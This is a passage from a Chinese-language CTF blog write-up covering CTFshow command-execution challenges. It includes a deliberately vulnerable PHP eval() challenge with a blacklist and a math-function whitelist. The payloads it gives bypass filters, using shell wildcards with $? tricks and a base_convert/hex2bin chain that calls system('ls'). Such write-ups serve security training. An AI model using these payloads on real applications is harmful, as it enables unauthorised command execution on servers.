</span></span><span class="line"><span class="ln">16</span><span class="cl">     <span class="k">echo</span> <span class="s1">&#39;&lt;div align=&#34;center&#34;&gt;evil input&lt;/div&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>这题把PWD和#也ban掉了</p>
<p>可以考虑用$?来代替${#1}</p>
<p>$?是表示上一条命令执行结束后的传回值。通常0代表执行成功，非0代表执行有误</p>
<p>所以我们可以构造payload:</p>
<pre tabindex="0"><code>&lt;A;${HOME::$?}???${HOME::$?}????${RANDOM::$?}? ????.??? 
</code></pre><blockquote>
<p>&lt;A指令不知道是啥，埋个坑</p></blockquote>
<h4 id="web124">web124<a hidden class="anchor" aria-hidden="true" href="#web124">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: 收集自网络
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-06 14:04:45
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="c1">//听说你很喜欢数学，不知道你是否爱它胜过爱flag
</span></span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="nx">show_source</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="c1">//例子 c=20-1
</span></span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="c1"></span>    <span class="nv">$content</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$content</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">80</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;太长了不会算&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="nv">$blacklist</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39; &#39;</span><span class="p">,</span> <span class="s1">&#39;\t&#39;</span><span class="p">,</span> <span class="s1">&#39;\r&#39;</span><span class="p">,</span> <span class="s1">&#39;\n&#39;</span><span class="p">,</span><span class="s1">&#39;\&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">,</span> <span class="s1">&#39;`&#39;</span><span class="p">,</span> <span class="s1">&#39;\[&#39;</span><span class="p">,</span> <span class="s1">&#39;\]&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$blacklist</span> <span class="k">as</span> <span class="nv">$blackitem</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nv">$blackitem</span> <span class="o">.</span> <span class="s1">&#39;/m&#39;</span><span class="p">,</span> <span class="nv">$content</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">            <span class="k">die</span><span class="p">(</span><span class="s2">&#34;请不要输入奇奇怪怪的字符&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">    <span class="c1">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
</span></span></span><span class="line"><span class="ln">29</span><span class="cl"><span class="c1"></span>    <span class="nv">$whitelist</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;abs&#39;</span><span class="p">,</span> <span class="s1">&#39;acos&#39;</span><span class="p">,</span> <span class="s1">&#39;acosh&#39;</span><span class="p">,</span> <span class="s1">&#39;asin&#39;</span><span class="p">,</span> <span class="s1">&#39;asinh&#39;</span><span class="p">,</span> <span class="s1">&#39;atan2&#39;</span><span class="p">,</span> <span class="s1">&#39;atan&#39;</span><span class="p">,</span> <span class="s1">&#39;atanh&#39;</span><span class="p">,</span> <span class="s1">&#39;base_convert&#39;</span><span class="p">,</span> <span class="s1">&#39;bindec&#39;</span><span class="p">,</span> <span class="s1">&#39;ceil&#39;</span><span class="p">,</span> <span class="s1">&#39;cos&#39;</span><span class="p">,</span> <span class="s1">&#39;cosh&#39;</span><span class="p">,</span> <span class="s1">&#39;decbin&#39;</span><span class="p">,</span> <span class="s1">&#39;dechex&#39;</span><span class="p">,</span> <span class="s1">&#39;decoct&#39;</span><span class="p">,</span> <span class="s1">&#39;deg2rad&#39;</span><span class="p">,</span> <span class="s1">&#39;exp&#39;</span><span class="p">,</span> <span class="s1">&#39;expm1&#39;</span><span class="p">,</span> <span class="s1">&#39;floor&#39;</span><span class="p">,</span> <span class="s1">&#39;fmod&#39;</span><span class="p">,</span> <span class="s1">&#39;getrandmax&#39;</span><span class="p">,</span> <span class="s1">&#39;hexdec&#39;</span><span class="p">,</span> <span class="s1">&#39;hypot&#39;</span><span class="p">,</span> <span class="s1">&#39;is_finite&#39;</span><span class="p">,</span> <span class="s1">&#39;is_infinite&#39;</span><span class="p">,</span> <span class="s1">&#39;is_nan&#39;</span><span class="p">,</span> <span class="s1">&#39;lcg_value&#39;</span><span class="p">,</span> <span class="s1">&#39;log10&#39;</span><span class="p">,</span> <span class="s1">&#39;log1p&#39;</span><span class="p">,</span> <span class="s1">&#39;log&#39;</span><span class="p">,</span> <span class="s1">&#39;max&#39;</span><span class="p">,</span> <span class="s1">&#39;min&#39;</span><span class="p">,</span> <span class="s1">&#39;mt_getrandmax&#39;</span><span class="p">,</span> <span class="s1">&#39;mt_rand&#39;</span><span class="p">,</span> <span class="s1">&#39;mt_srand&#39;</span><span class="p">,</span> <span class="s1">&#39;octdec&#39;</span><span class="p">,</span> <span class="s1">&#39;pi&#39;</span><span class="p">,</span> <span class="s1">&#39;pow&#39;</span><span class="p">,</span> <span class="s1">&#39;rad2deg&#39;</span><span class="p">,</span> <span class="s1">&#39;rand&#39;</span><span class="p">,</span> <span class="s1">&#39;round&#39;</span><span class="p">,</span> <span class="s1">&#39;sin&#39;</span><span class="p">,</span> <span class="s1">&#39;sinh&#39;</span><span class="p">,</span> <span class="s1">&#39;sqrt&#39;</span><span class="p">,</span> <span class="s1">&#39;srand&#39;</span><span class="p">,</span> <span class="s1">&#39;tan&#39;</span><span class="p">,</span> <span class="s1">&#39;tanh&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">    <span class="nx">preg_match_all</span><span class="p">(</span><span class="s1">&#39;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#39;</span><span class="p">,</span> <span class="nv">$content</span><span class="p">,</span> <span class="nv">$used_funcs</span><span class="p">);</span>  
</span></span><span class="line"><span class="ln">31</span><span class="cl">    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$used_funcs</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$func</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$func</span><span class="p">,</span> <span class="nv">$whitelist</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">            <span class="k">die</span><span class="p">(</span><span class="s2">&#34;请不要输入奇奇怪怪的函数&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">    <span class="c1">//帮你算出答案
</span></span></span><span class="line"><span class="ln">37</span><span class="cl"><span class="c1"></span>    <span class="k">eval</span><span class="p">(</span><span class="s1">&#39;echo &#39;</span><span class="o">.</span><span class="nv">$content</span><span class="o">.</span><span class="s1">&#39;;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>这题设置了白名单和黑名单，白名单是数学函数，黑名单则是一些符号，而且有长度限制</p>
<p>这题的思路其实就是要考虑用数字通过数学运算函数的转换来构造出我们需要用到的字符</p>
<p>就比如我们可以先将需要的字符转换成16进制后再转换成10进制，再执行命令的时候通过数学函数转换回去</p>
<p><a href="https://www.cnblogs.com/FallenStar/articles/17064728.html">CTFshow-WEB入门-命令执行web124 - Hacker&amp;Cat - 博客园</a></p>
<pre tabindex="0"><code>目标代码：$_GET[&#39;abs&#39;]($_GET[&#39;acos&#39;])
</code></pre><pre tabindex="0"><code>dechex()，10进制转16进制

base_convert(值,原进制,目标进制)，任意进制转换

hex2bin，16进制转字符串
</code></pre><p>解题：</p>
<p>base_convert(26941962055,10,34) 为 hex2bin</p>
<p>base_convert(26941962055,10,34)(dechex(1598506324)) 为 _GET</p>
<p>构造payload</p>
<pre tabindex="0"><code>c=$pi=base_convert(26941962055,10,34)(dechex(1598506324));$$pi{abs}($$pi{asin})&amp;abs=system&amp;asin=ls
</code></pre>

  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="http://localhost:1313/tags/writeup/">Writeup</a></li>
      <li><a href="http://localhost:1313/tags/ctf/">Ctf</a></li>
      <li><a href="http://localhost:1313/tags/web/">Web</a></li>
    </ul>
<nav class="paginav">
  <a class="prev" href="http://localhost:1313/post/ctfshow/ctfshow_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
    <span class="title">« 上一页</span>
    <br>
    <span>CTFSHOW-反序列化-Writeup</span>
  </a>
  <a class="next" href="http://localhost:1313/post/ctfshow/ctfshow_%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
    <span class="title">下一页 »</span>
    <br>
    <span>CTFSHOW-文件包含-Writeup</span>
  </a>
</nav>

  </footer><div id="tw-comment"></div>
<script>
    
    const getStoredTheme = () => localStorage.getItem("pref-theme") === "light" ? "light" : "dark";
    const setGiscusTheme = () => {
        const sendMessage = (message) => {
            const iframe = document.querySelector('iframe.giscus-frame');
            if (iframe) {
                iframe.contentWindow.postMessage({giscus: message}, 'https://giscus.app');
            }
        }
        sendMessage({setConfig: {theme: getStoredTheme()}})
    }

    document.addEventListener("DOMContentLoaded", () => {
        const giscusAttributes = {
            "src": "https://giscus.app/client.js",
            "data-repo": "sonnycalcr\/sonnycalcr.github.io",
            "data-repo-id": "xxxxxx",
            "data-category": "Announcements",
            "data-category-id": "xxxxx",
            "data-mapping": "pathname",
            "data-strict": "0",
            "data-reactions-enabled": "1",
            "data-emit-metadata": "0",
            "data-input-position": "bottom",
            "data-theme": getStoredTheme(),
            "data-lang": "zh-CN",
            "data-loading": "lazy",
            "crossorigin": "anonymous",
        };

        
        const giscusScript = document.createElement("script");
        Object.entries(giscusAttributes).forEach(
                ([key, value]) => giscusScript.setAttribute(key, value));
        document.querySelector("#tw-comment").appendChild(giscusScript);

        
        const themeSwitcher = document.querySelector("#theme-toggle");
        if (themeSwitcher) {
            themeSwitcher.addEventListener("click", setGiscusTheme);
        }
        const themeFloatSwitcher = document.querySelector("#theme-toggle-float");
        if (themeFloatSwitcher) {
            themeFloatSwitcher.addEventListener("click", setGiscusTheme);
        }
    });
</script>
</article>
    </main>
    
<footer class="footer">
        <span><a href="https://blog.xrntkk.top/">©2024 Xrntkk&rsquo;s Blog</a></span> · 


    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
    <div class="busuanzi-footer">
        <span id="busuanzi_container_site_pv">Site Visits：<span id="busuanzi_value_site_pv"></span></span>
    </div></footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = '复制';

        function copyingDone() {
            copybutton.innerHTML = '已复制！';
            setTimeout(() => {
                copybutton.innerHTML = '复制';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
